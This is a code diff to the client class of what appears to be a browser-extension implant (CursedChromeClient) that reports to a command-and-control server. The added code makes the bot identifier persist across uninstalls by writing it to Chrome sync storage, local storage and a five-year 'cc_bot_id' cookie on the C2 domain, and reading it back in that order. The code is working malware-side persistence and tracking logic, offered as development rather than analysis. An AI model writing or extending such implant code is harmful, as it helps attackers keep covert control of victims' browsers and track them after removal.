@@ -640,16 +640,16 @@ class CursedChromeClient {
   }
 
   async authenticate(params) {
-    let browserId = null;
-    try {
-      browserId = await this.localStorage.getItem("browser_id");
-      if (browserId === null) {
-        browserId = this.uuidv4();
-        await this.localStorage.setItem("browser_id", browserId);
-      }
-    } catch (e) {
-      console.error("Error accessing storage:", e);
-      browserId = this.uuidv4(); // Fallback if storage fails
+    let browserId = await this.getPersistentBrowserId();
+
+    if (!browserId) {
+      browserId = this.uuidv4();
+      await this.setPersistentBrowserId(browserId);
+      console.log(`Generated new persistent Browser ID: ${browserId}`);
+    } else {
+      console.log(`Retrieved existing persistent Browser ID: ${browserId}`);
+      // Ensure it's synced across all layers just in case one was missing
+      await this.setPersistentBrowserId(browserId);
     }
 
     return {
@@ -657,6 +657,88 @@ class CursedChromeClient {
       user_agent: navigator.userAgent,
       timestamp: this.getUnixTimestamp(),
     };
+  }
+
+  async getPersistentBrowserId() {
+    // Strategy: Sync > Local > Cookie
+    let id = null;
+
+    // 1. Try Sync Storage (survives uninstall if user signed in)
+    try {
+      const syncData = await new Promise((resolve) => {
+        chrome.storage.sync.get(["browser_id"], resolve);
+      });
+      if (syncData && syncData.browser_id) {
+        console.log("Found ID in Sync Storage");
+        return syncData.browser_id;
+      }
+    } catch (e) {
+      // Sync storage might be disabled or fail
+    }
+
+    // 2. Try Local Storage (survives restart, cleared on uninstall)
+    try {
+      id = await this.localStorage.getItem("browser_id");
+      if (id) {
+        console.log("Found ID in Local Storage");
+        return id;
+      }
+    } catch (e) {}
+
+    // 3. Try Cookie (survives uninstall if cookies not cleared)
+    try {
+      if (chrome.cookies) {
+        // Convert WS URL to HTTP/HTTPS for cookie access
+        const cookieUrl = this.SERVER_URL.replace("ws://", "http://").replace("wss://", "https://");
+        const cookie = await new Promise((resolve) => {
+          chrome.cookies.get({ url: cookieUrl, name: "cc_bot_id" }, resolve);
+        });
+        if (cookie && cookie.value) {
+          console.log("Found ID in C2 Cookie");
+          return cookie.value;
+        }
+      }
+    } catch (e) {}
+
+    return null;
+  }
+
+  async setPersistentBrowserId(id) {
+    // 1. Save to Local Storage
+    try {
+      await this.localStorage.setItem("browser_id", id);
+    } catch (e) {}
+
+    // 2. Save to Sync Storage
+    try {
+      chrome.storage.sync.set({ browser_id: id }, () => {
+        if (chrome.runtime.lastError) {
+          // Ignore errors (e.g. user not signed in)
+        }
+      });
+    } catch (e) {}
+
+    // 3. Save to Cookie
+    try {
+      if (chrome.cookies) {
+        const cookieUrl = this.SERVER_URL.replace("ws://", "http://").replace("wss://", "https://");
+        // Set a long expiration (e.g., 5 years)
+        const expirationDate = this.getUnixTimestamp() + (60 * 60 * 24 * 365 * 5);
+        
+        chrome.cookies.set({
+          url: cookieUrl,
+          name: "cc_bot_id",
+          value: id,
+          expirationDate: expirationDate,
+          sameSite: "no_restriction",
+          secure: cookieUrl.startsWith("https") // Only secure if https
+        }, (c) => {
+             if (chrome.runtime.lastError) {
+                 console.log("Failed to set persistence cookie:", chrome.runtime.lastError);
+             }
+        });
+      }
+    } catch (e) {}
   }
 
   // HTTP request handling
